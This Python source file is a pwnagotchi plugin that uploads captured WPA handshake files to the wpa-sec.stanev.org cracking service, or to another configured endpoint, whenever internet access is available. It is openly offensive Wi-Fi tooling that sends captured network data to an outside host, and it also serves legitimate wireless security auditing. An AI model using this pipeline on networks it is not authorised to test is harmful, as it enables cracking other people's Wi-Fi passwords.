import os
import logging
import requests
from pwnagotchi.utils import StatusFile
import pwnagotchi.plugins as plugins


class WpaSec(plugins.Plugin):
    __author__ = '33197631+dadav@users.noreply.github.com'
    __version__ = '2.0.1'
    __license__ = 'GPL3'
    __description__ = 'This plugin automatically uploads handshakes to https://wpa-sec.stanev.org'

    def __init__(self):
        self.ready = False
        self.report = StatusFile('/root/.wpa_sec_uploads', data_format='json')
        self.options = dict()
        self.skip = list()

    def _upload_to_wpasec(self, path, timeout=30):
        """
        Uploads the file to https://wpa-sec.stanev.org, or another endpoint.
        """
        with open(path, 'rb') as file_to_upload:
            cookie = {'key': self.options['api_key']}
            payload = {'file': file_to_upload}

            try:
                result = requests.post(self.options['api_url'],
                                       cookies=cookie,
                                       files=payload,
                                       timeout=timeout)
                if ' already submitted' in result.text:
                    logging.warning("%s was already submitted.", path)
            except requests.exceptions.RequestException as req_e:
                raise req_e

    def on_loaded(self):
        """
        Gets called when the plugin gets loaded
        """
        if 'api_key' not in self.options or ('api_key' in self.options and self.options['api_key'] is None):
            logging.error("WPA_SEC: API-KEY isn't set. Can't upload to wpa-sec.stanev.org")
            return

        if 'api_url' not in self.options or ('api_url' in self.options and self.options['api_url'] is None):
            logging.error("WPA_SEC: API-URL isn't set. Can't upload, no endpoint configured.")
            return

        self.ready = True

    def on_internet_available(self, agent):
        """
        Called in manual mode when there's internet connectivity
        """
        if self.ready:
            config = agent.config()
            display = agent.view()
            reported = self.report.data_field_or('reported', default=list())

            handshake_dir = config['bettercap']['handshakes']
            handshake_filenames = os.listdir(handshake_dir)
            handshake_paths = [os.path.join(handshake_dir, filename) for filename in handshake_filenames if
                               filename.endswith('.pcap')]
            handshake_new = set(handshake_paths) - set(reported) - set(self.skip)

            if handshake_new:
                logging.info("WPA_SEC: Internet connectivity detected. Uploading new handshakes to wpa-sec.stanev.org")

                for idx, handshake in enumerate(handshake_new):
                    display.set('status', f"Uploading handshake to wpa-sec.stanev.org ({idx + 1}/{len(handshake_new)})")
                    display.update(force=True)
                    try:
                        self._upload_to_wpasec(handshake)
                        reported.append(handshake)
                        self.report.update(data={'reported': reported})
                        logging.info("WPA_SEC: Successfully uploaded %s", handshake)
                    except requests.exceptions.RequestException as req_e:
                        self.skip.append(handshake)
                        logging.error("WPA_SEC: %s", req_e)
                        continue
                    except OSError as os_e:
                        logging.error("WPA_SEC: %s", os_e)
                        continue
